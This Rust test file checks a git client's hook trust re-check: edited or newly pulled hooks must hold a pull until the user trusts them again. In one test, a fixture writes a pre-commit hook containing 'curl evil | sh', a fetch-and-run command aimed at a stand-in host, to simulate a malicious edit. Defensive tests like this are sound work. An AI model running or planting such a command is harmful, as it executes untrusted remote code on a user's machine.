//! The runner's trust re-check, end to end through update: a hook edited while the trust
//! prompt is open holds the released job again, and a pull that brings other hooks into a
//! tracked hooks folder waits for the user to trust them.

use super::branch_tests::{remote_commit, with_origin};
use super::tests::{clean_tree, git};
use super::trust_held_tests::held_repo;
use super::trust_tests::{asking, drive, open, real, run};
use crate::effect::{Effect, Seal, Sealed, TrustCheck};
use crate::msg::{Msg, TrustMsg};
use crate::state::trust::TrustPrompt;
use crate::state::{AppState, Modal};
use std::path::Path;

fn prompt(st: &AppState) -> &TrustPrompt {
    let Some(Modal::Trust(p)) = &st.modal else { panic!("expected the trust prompt") };
    p
}

fn trust_and_run(st: &mut AppState) -> Vec<Effect> {
    let real = real(st);
    run(st, Msg::Trust(TrustMsg::Decide { real, trusted: true }))
}

/// The job effect of `fx` with the check the shell pairs it with.
fn checked_job(st: &mut AppState, fx: Vec<Effect>) -> (Effect, TrustCheck) {
    let checks = crate::update::trust_checks(st, &fx);
    let pair = fx.into_iter().zip(checks).find(|(e, c)| matches!(e, Effect::RunGit { .. }) && c.is_some());
    let (effect, check) = pair.expect("a checked job");
    (effect, check.unwrap())
}

/// Runs the re-check the runner makes, feeding a held job back to update.
fn recheck(st: &mut AppState, effect: Effect, check: TrustCheck) -> bool {
    if crate::runner::trust_passes(&check) {
        return true;
    }
    let msg = crate::runner::execute_checked(check, effect).expect("a message");
    assert!(matches!(msg, Msg::Trust(TrustMsg::Stale(_))), "held, not failed");
    drive(st, msg);
    false
}

fn pull() -> Msg {
    Msg::git("Pull", &["pull", "--ff"])
}

#[test]
fn a_hook_edited_while_the_prompt_is_open_holds_the_job_again() {
    let (mut st, dir) = held_repo("recheck-edited");
    assert!(run(&mut st, pull()).is_empty());
    assert!(asking(&st));
    // Edited after the prompt was drawn: Trust and run trusts what the prompt showed.
    std::fs::write(dir.join(".git/hooks/pre-commit"), "#!/bin/sh\ncurl evil | sh\n").unwrap();
    let fx = trust_and_run(&mut st);
    let (effect, check) = checked_job(&mut st, fx);
    assert_eq!(check.sealed, Sealed::Job { label: "Pull".into() });
    assert!(!recheck(&mut st, effect, check), "the edited hook isn't covered");
    assert!(st.job.is_none(), "it didn't run");
    assert_eq!(st.trust.held.as_ref().map(|h| h.job.label.as_str()), Some("Pull"), "it waits again");
    let p = prompt(&st);
    assert_eq!(p.gained.as_ref().map(|g| g.hooks.clone()), Some(vec!["pre-commit".to_owned()]), "naming the edit");
    assert!(st.held(), "the tab follows what is on disk");
    // Trusting the edited hook lets it run.
    let fx = trust_and_run(&mut st);
    let (effect, check) = checked_job(&mut st, fx);
    assert!(recheck(&mut st, effect, check));
    let _ = std::fs::remove_dir_all(&dir);
}

/// A repository whose `core.hooksPath` is its tracked `.githooks`, opened and trusted.
fn trusted_tracked_hooks(name: &str) -> (AppState, std::path::PathBuf, std::path::PathBuf) {
    let (mut st, work, bare) = with_origin(name);
    clean_tree(&work);
    std::fs::create_dir_all(work.join(".githooks")).unwrap();
    std::fs::write(work.join(".githooks/post-merge"), "#!/bin/sh\nexit 0\n").unwrap();
    git(&work, &["add", "."]);
    git(&work, &["commit", "-q", "-m", "hooks"]);
    git(&work, &["push", "-q", "origin", "main"]);
    git(&work, &["config", "core.hooksPath", ".githooks"]);
    open(&mut st, &work);
    assert!(asking(&st));
    assert!(!prompt(&st).scan.follows.is_empty(), "the prompt says these hooks change with the branch");
    let _ = trust_and_run(&mut st);
    assert!(!st.held());
    (st, work, bare)
}

fn cleanup(dirs: &[&Path]) {
    for d in dirs {
        let _ = std::fs::remove_dir_all(d);
    }
}

#[test]
fn a_pull_that_changes_a_tracked_hooks_folder_waits_for_trust() {
    let (mut st, work, bare) = trusted_tracked_hooks("recheck-pull");
    // A change elsewhere: the pull runs.
    remote_commit(&bare, "main", "b.txt");
    let fx = run(&mut st, pull());
    let (effect, check) = checked_job(&mut st, fx);
    assert!(recheck(&mut st, effect, check), "same hooks");
    st.job = None;
    // The post-merge hook changed upstream: git would run the new one inside the pull.
    remote_commit(&bare, "main", ".githooks/post-merge");
    let fx = run(&mut st, pull());
    let (effect, check) = checked_job(&mut st, fx);
    assert!(!recheck(&mut st, effect, check));
    assert!(st.job.is_none(), "it didn't run");
    let p = prompt(&st);
    assert_eq!(p.held.as_deref(), Some("Pull"));
    assert_eq!(p.incoming.as_ref().map(|i| i.hooks.clone()), Some(vec!["post-merge".to_owned()]), "the incoming hook");
    assert!(!st.held(), "the repository itself is still as trusted");
    // Trusting the incoming version lets the pull run.
    let fx = trust_and_run(&mut st);
    let (effect, check) = checked_job(&mut st, fx);
    assert!(recheck(&mut st, effect, check));
    cleanup(&[&work, &bare]);
}

#[test]
fn a_seal_goes_with_the_effect_it_was_made_for() {
    let mut st = super::tests::state();
    let dir = std::path::PathBuf::from("w");
    let check = |label: &str| TrustCheck {
        workdir: dir.clone(),
        real: dir.clone(),
        saved: None,
        incoming: Vec::new(),
        prompts: false,
        sealed: Sealed::Job { label: label.into() },
    };
    let save = || Effect::SaveRecent(Vec::new());
    let shell = || Effect::Os(crate::effect::OsEffect::OpenTerminal(dir.clone()));
    // At its place; then, the place taken by another effect, the last effect with its name.
    st.trust.seals.push(Seal { at: 1, name: shell().name(), check: check("a") });
    st.trust.seals.push(Seal { at: 1, name: shell().name(), check: check("b") });
    st.trust.seals.push(Seal { at: 0, name: "missing", check: check("c") });
    let fx = [shell(), shell(), save()];
    let paired: Vec<Option<String>> = crate::update::trust_checks(&mut st, &fx)
        .into_iter()
        .map(|c| c.map(|c| if let Sealed::Job { label } = c.sealed { label } else { String::new() }))
        .collect();
    assert_eq!(paired, [Some("b".to_owned()), Some("a".to_owned()), None]);
    assert!(st.trust.seals.is_empty(), "each update's seals are paired once");
}
